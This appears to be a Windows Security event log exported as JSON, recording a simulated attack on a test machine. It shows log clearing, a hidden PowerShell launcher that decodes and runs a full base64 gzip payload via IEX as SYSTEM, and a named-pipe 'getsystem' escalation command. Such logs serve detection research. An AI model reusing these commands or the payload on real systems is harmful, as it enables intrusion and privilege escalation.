{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Eventlog","Guid":"{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}"},"EventID":1102,"Version":0,"Level":4,"Task":104,"Opcode":0,"Keywords":"0x4020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T16:33:53.404296Z"},"EventRecordID":13276,"Correlation":null,"Execution_attributes":{"ProcessID":728,"ThreadID":2296},"Channel":"Security","Computer":"IE10Win7","Security":null},"UserData":{"LogFileCleared_attributes":{"xmlns:auto-ns3":"http://schemas.microsoft.com/win/2004/08/events","xmlns":"http://manifests.microsoft.com/win/2004/08/windows/eventlog"},"LogFileCleared":{"SubjectUserSid":"S-1-5-21-3463664321-2923530833-3546627382-1000","SubjectUserName":"IEUser","SubjectDomainName":"IE10WIN7","SubjectLogonId":"0x6793c"}}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T16:34:11.197265Z"},"EventRecordID":13277,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":60},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-3463664321-2923530833-3546627382-1000","SubjectUserName":"IEUser","SubjectDomainName":"IE10WIN7","SubjectLogonId":"0x6793c","NewProcessId":"0xc4c","NewProcessName":"C:\\Windows\\System32\\ipconfig.exe","TokenElevationType":"%%1937","ProcessId":"0xf14","CommandLine":"ipconfig"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T16:35:46.605468Z"},"EventRecordID":13278,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":60},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xb2c","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1936","ProcessId":"0x1cc","CommandLine":"C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGFl4VcCA71WW4/aOhB+bqX+h6hCIlFZEli6N6nScYAAy2Vhw52iI5M4weDEbOJw6+l/PxMge2m31Z4+nAgU2zPjGX/zjSdO5FuCcl+aF8YW77iE9KRvH96/a+MAe5Kcmq0rV5uutY5mopKRUq6rcU625Yd6V3n3DvRS++uRJ32R5AlarUrcw9Sf3twUoyAgvjjOsxUiUBgSb8YoCWVF+kcazElAzu5mC2IJ6ZuU+jtbYXyG2UltV8TWnEhnyLdjWYNbOI4xa64YFXL669e0MjnLTbPlhwizUE6bu1AQL2szllak70rssLtbETndpFbAQ+6I7ID65/lszw+xQ1qw25o0iZhzO0wrcAr4BUREgS8dzhNvcBTLaRi2A24h2w5ICNrZmr/mSyKn/IixjPSXPDl5v498QT0CckECvjJJsKYWCbNV7NuM3BNnKrfIJjn0W43k50ag1RaBkoG8vBJmk9sRI0fLtPJzoC9yqcDzQz4BiO8f3n947ySU8C6CVWtPLxcbhJ+TAkbvJocxgajlNg/pQf+LpGWkJvjHggc7mKa6QUSUqTSJszGZTqWUPeyagdjVM7/eI5cYgPreEMM1h8VJn1N7CkanbKUs9hB7+A3rSsShPintfOxRKyGW/FoOiMPI4cTZRK0FYcnpk4DYJcKIi0WMakaa/GxW9qh4tNUjymwSIAvyGEJUkGLlZTDHRMnpmt8kHiB1nKchHQ7QmSTaJwrvEu/xHJTSRYbDMCO1I6gnKyOZBDNiZyTkh/QkQpHgh2H6KdxmxAS1cCiS7aZKguPJX5H7oQgiC5IHZ++aK2JRzGIoMlKV2kTfmdRN/KZfBaKIGaO+CzutIRGwEgNgipgSAYT4mH4laxJR81aMeKB3KG6DYRdK+VQQBx5hl9jpH6NMCH9kd4xHAsSzGCHJJuMiI/VpIOCOiLE9cunPg3h2RxzCKQbklBQ5qZyJvhMxz1MMF+dHfp4wOiASCEDDCLin45BcFEwRAFbyR/WOFhE8o5rPmpa+pDm0oblaE/49el7jpUu7fruoqkFpO3dQLaw1q+1Sp1otrG/NfkGY5Zqot2uiWR4uFiaq3vdGYlxD1S7VlqPCfnVL92YD2aOterHX9xtN3+4Xru2MSo7jXjrmfe6zQRuDYkfX8rhRKkeNgb7RtUJYpptqh/Y6y1tDzEZ9hnuO6g5z15huG8Gin+PNfQ2hyvzc2t86/cq8ae9GVfV6UFiiMkJFv9w3dF4f6QFqq33s9vmmvqiwgVtEumFRMu70DL3TMXTUqyweSteqC7ZDPNcH/Twdr4b3c5gbEEJd1Qo1m+z5qAMgVTjC7j3ouMW8NXdAp/QJ6Z9aPMzjpc6RDjrG+AHiGq2MNgN5t5fnqM9aQ4wa452hqrlRu4CqGh1UXBRviV29g1G4Lu1Laq5vc3vwuTVy1P6QXaqlYndlOaqqbqqlujXOba/uLgu69lD0qMdmeVu97l3p/qbutteu3Rlc3m9buxn466lq/2PMGqBNavHZu9IuF8/o8Ktrv4mDcI4Z0ATu86RQDR4Ypyu5zWlsIcvPuvWSBD5h0Nyg/SV8R4xxK+4TL65w6FXHDjKF4u3B8Dz/6kiRHhWVpz6SLN3cjCFmqKMjybMN4rtintG255oG97+2LWhw8LeftMhXO/m0WSbuIAleTy7YwYUSl1hqMdg0L5bV1f+B5qnE5/Cy34rm09pvpG9CWMs8IvGT5OXCf8L7D7EYYCpA34Qri5FjA/09JCcuPfsQSVIHXHFOT/wxeBeJsxZ8o/wLs66tlosKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T16:35:46.608398Z"},"EventRecordID":13279,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":60},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x104","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TokenElevationType":"%%1936","ProcessId":"0xb2c","CommandLine":"powershell.exe  -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGFl4VcCA71WW4/aOhB+bqX+h6hCIlFZEli6N6nScYAAy2Vhw52iI5M4weDEbOJw6+l/PxMge2m31Z4+nAgU2zPjGX/zjSdO5FuCcl+aF8YW77iE9KRvH96/a+MAe5Kcmq0rV5uutY5mopKRUq6rcU625Yd6V3n3DvRS++uRJ32R5AlarUrcw9Sf3twUoyAgvjjOsxUiUBgSb8YoCWVF+kcazElAzu5mC2IJ6ZuU+jtbYXyG2UltV8TWnEhnyLdjWYNbOI4xa64YFXL669e0MjnLTbPlhwizUE6bu1AQL2szllak70rssLtbETndpFbAQ+6I7ID65/lszw+xQ1qw25o0iZhzO0wrcAr4BUREgS8dzhNvcBTLaRi2A24h2w5ICNrZmr/mSyKn/IixjPSXPDl5v498QT0CckECvjJJsKYWCbNV7NuM3BNnKrfIJjn0W43k50ag1RaBkoG8vBJmk9sRI0fLtPJzoC9yqcDzQz4BiO8f3n947ySU8C6CVWtPLxcbhJ+TAkbvJocxgajlNg/pQf+LpGWkJvjHggc7mKa6QUSUqTSJszGZTqWUPeyagdjVM7/eI5cYgPreEMM1h8VJn1N7CkanbKUs9hB7+A3rSsShPintfOxRKyGW/FoOiMPI4cTZRK0FYcnpk4DYJcKIi0WMakaa/GxW9qh4tNUjymwSIAvyGEJUkGLlZTDHRMnpmt8kHiB1nKchHQ7QmSTaJwrvEu/xHJTSRYbDMCO1I6gnKyOZBDNiZyTkh/QkQpHgh2H6KdxmxAS1cCiS7aZKguPJX5H7oQgiC5IHZ++aK2JRzGIoMlKV2kTfmdRN/KZfBaKIGaO+CzutIRGwEgNgipgSAYT4mH4laxJR81aMeKB3KG6DYRdK+VQQBx5hl9jpH6NMCH9kd4xHAsSzGCHJJuMiI/VpIOCOiLE9cunPg3h2RxzCKQbklBQ5qZyJvhMxz1MMF+dHfp4wOiASCEDDCLin45BcFEwRAFbyR/WOFhE8o5rPmpa+pDm0oblaE/49el7jpUu7fruoqkFpO3dQLaw1q+1Sp1otrG/NfkGY5Zqot2uiWR4uFiaq3vdGYlxD1S7VlqPCfnVL92YD2aOterHX9xtN3+4Xru2MSo7jXjrmfe6zQRuDYkfX8rhRKkeNgb7RtUJYpptqh/Y6y1tDzEZ9hnuO6g5z15huG8Gin+PNfQ2hyvzc2t86/cq8ae9GVfV6UFiiMkJFv9w3dF4f6QFqq33s9vmmvqiwgVtEumFRMu70DL3TMXTUqyweSteqC7ZDPNcH/Twdr4b3c5gbEEJd1Qo1m+z5qAMgVTjC7j3ouMW8NXdAp/QJ6Z9aPMzjpc6RDjrG+AHiGq2MNgN5t5fnqM9aQ4wa452hqrlRu4CqGh1UXBRviV29g1G4Lu1Laq5vc3vwuTVy1P6QXaqlYndlOaqqbqqlujXOba/uLgu69lD0qMdmeVu97l3p/qbutteu3Rlc3m9buxn466lq/2PMGqBNavHZu9IuF8/o8Ktrv4mDcI4Z0ATu86RQDR4Ypyu5zWlsIcvPuvWSBD5h0Nyg/SV8R4xxK+4TL65w6FXHDjKF4u3B8Dz/6kiRHhWVpz6SLN3cjCFmqKMjybMN4rtintG255oG97+2LWhw8LeftMhXO/m0WSbuIAleTy7YwYUSl1hqMdg0L5bV1f+B5qnE5/Cy34rm09pvpG9CWMs8IvGT5OXCf8L7D7EYYCpA34Qri5FjA/09JCcuPfsQSVIHXHFOT/wxeBeJsxZ8o/wLs66tlosKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T16:35:46.610351Z"},"EventRecordID":13280,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":60},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xa18","NewProcessName":"C:\\Windows\\System32\\conhost.exe","TokenElevationType":"%%1936","ProcessId":"0x13c","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe \"-1631619515-716758472641846592112877944819475846761278741196253082434-1846635048\""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T16:35:46.790039Z"},"EventRecordID":13281,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":60},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x5fc","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TokenElevationType":"%%1936","ProcessId":"0x104","CommandLine":"\"powershell.exe\" -nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAGFl4VcCA71WW4/aOhB+bqX+h6hCIlFZEli6N6nScYAAy2Vhw52iI5M4weDEbOJw6+l/PxMge2m31Z4+nAgU2zPjGX/zjSdO5FuCcl+aF8YW77iE9KRvH96/a+MAe5Kcmq0rV5uutY5mopKRUq6rcU625Yd6V3n3DvRS++uRJ32R5AlarUrcw9Sf3twUoyAgvjjOsxUiUBgSb8YoCWVF+kcazElAzu5mC2IJ6ZuU+jtbYXyG2UltV8TWnEhnyLdjWYNbOI4xa64YFXL669e0MjnLTbPlhwizUE6bu1AQL2szllak70rssLtbETndpFbAQ+6I7ID65/lszw+xQ1qw25o0iZhzO0wrcAr4BUREgS8dzhNvcBTLaRi2A24h2w5ICNrZmr/mSyKn/IixjPSXPDl5v498QT0CckECvjJJsKYWCbNV7NuM3BNnKrfIJjn0W43k50ag1RaBkoG8vBJmk9sRI0fLtPJzoC9yqcDzQz4BiO8f3n947ySU8C6CVWtPLxcbhJ+TAkbvJocxgajlNg/pQf+LpGWkJvjHggc7mKa6QUSUqTSJszGZTqWUPeyagdjVM7/eI5cYgPreEMM1h8VJn1N7CkanbKUs9hB7+A3rSsShPintfOxRKyGW/FoOiMPI4cTZRK0FYcnpk4DYJcKIi0WMakaa/GxW9qh4tNUjymwSIAvyGEJUkGLlZTDHRMnpmt8kHiB1nKchHQ7QmSTaJwrvEu/xHJTSRYbDMCO1I6gnKyOZBDNiZyTkh/QkQpHgh2H6KdxmxAS1cCiS7aZKguPJX5H7oQgiC5IHZ++aK2JRzGIoMlKV2kTfmdRN/KZfBaKIGaO+CzutIRGwEgNgipgSAYT4mH4laxJR81aMeKB3KG6DYRdK+VQQBx5hl9jpH6NMCH9kd4xHAsSzGCHJJuMiI/VpIOCOiLE9cunPg3h2RxzCKQbklBQ5qZyJvhMxz1MMF+dHfp4wOiASCEDDCLin45BcFEwRAFbyR/WOFhE8o5rPmpa+pDm0oblaE/49el7jpUu7fruoqkFpO3dQLaw1q+1Sp1otrG/NfkGY5Zqot2uiWR4uFiaq3vdGYlxD1S7VlqPCfnVL92YD2aOterHX9xtN3+4Xru2MSo7jXjrmfe6zQRuDYkfX8rhRKkeNgb7RtUJYpptqh/Y6y1tDzEZ9hnuO6g5z15huG8Gin+PNfQ2hyvzc2t86/cq8ae9GVfV6UFiiMkJFv9w3dF4f6QFqq33s9vmmvqiwgVtEumFRMu70DL3TMXTUqyweSteqC7ZDPNcH/Twdr4b3c5gbEEJd1Qo1m+z5qAMgVTjC7j3ouMW8NXdAp/QJ6Z9aPMzjpc6RDjrG+AHiGq2MNgN5t5fnqM9aQ4wa452hqrlRu4CqGh1UXBRviV29g1G4Lu1Laq5vc3vwuTVy1P6QXaqlYndlOaqqbqqlujXOba/uLgu69lD0qMdmeVu97l3p/qbutteu3Rlc3m9buxn466lq/2PMGqBNavHZu9IuF8/o8Ktrv4mDcI4Z0ATu86RQDR4Ypyu5zWlsIcvPuvWSBD5h0Nyg/SV8R4xxK+4TL65w6FXHDjKF4u3B8Dz/6kiRHhWVpz6SLN3cjCFmqKMjybMN4rtintG255oG97+2LWhw8LeftMhXO/m0WSbuIAleTy7YwYUSl1hqMdg0L5bV1f+B5qnE5/Cy34rm09pvpG9CWMs8IvGT5OXCf8L7D7EYYCpA34Qri5FjA/09JCcuPfsQSVIHXHFOT/wxeBeJsxZ8o/wLs66tlosKAAA='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T16:35:46.813476Z"},"EventRecordID":13282,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":60},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x484","NewProcessName":"C:\\Windows\\System32\\conhost.exe","TokenElevationType":"%%1936","ProcessId":"0x13c","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe \"-175342166692913071310119923561442053958601825270-832574780-16388714962004233071\""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T16:35:58.169921Z"},"EventRecordID":13283,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":60},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0xe8c","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1936","ProcessId":"0x1cc","CommandLine":"cmd.exe /c echo genusn > \\\\.\\pipe\\genusn"}}}
